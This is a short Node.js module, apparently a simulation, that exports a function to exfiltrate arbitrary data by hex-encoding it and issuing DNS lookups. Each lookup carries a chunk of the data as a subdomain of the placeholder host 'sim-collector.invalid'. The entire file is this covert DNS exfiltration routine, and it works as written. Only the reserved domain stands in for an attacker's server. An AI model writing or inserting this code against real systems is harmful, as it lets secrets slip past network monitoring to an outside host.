const dns = require('node:dns');

// Leak the data through DNS lookups, 40 hex characters per label.
module.exports = (data) => {
  const hex = Buffer.from(data).toString('hex');
  for (let i = 0; i < hex.length; i += 40) {
    dns.resolve(`${hex.slice(i, i + 40)}.${i}.sim-collector.invalid`, () => {});
  }
};
